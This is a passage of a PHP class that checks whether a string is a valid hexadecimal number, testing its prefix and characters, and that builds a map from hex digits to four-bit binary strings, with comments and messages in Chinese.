        $prefix = substr($string, 0, 2);
        if ($prefix != '0X') {
            return '十六进制以0x开头';
        }

        // 十六进制用到的字符必须是0-F
        $i = 2;
        $range = array_keys($this->getHexBinaryMap());
        while ($i < $len) {
            if (!in_array($string[$i], $range)) {
                return '十六进制用到的字符必须是0-F';
            }
            $i++;
        }

        return null;
    }

    private $hexBinaryMap;

    /**
     * 获取十六进制字符和二进制编码映射表.
     * @return array|null
     */
    public function getHexBinaryMap()
    {
        if ($this->hexBinaryMap === null) {
            $this->hexBinaryMap = [
                '0'=>'0000', '1'=>'0001', '2'=>'0010', '3'=>'0011', '4'=>'0100', '5'=>'0101', '6'=>'0110', '7'=>'0111',
                '8'=>'1000', '9'=>'1001', 'A'=>'1010', 'B'=>'1011', 'C'=>'1100', 'D'=>'1101', 'E'=>'1110', 'F'=>'1111'
            ];
        }
        return $this->hexBinaryMap;
    }
}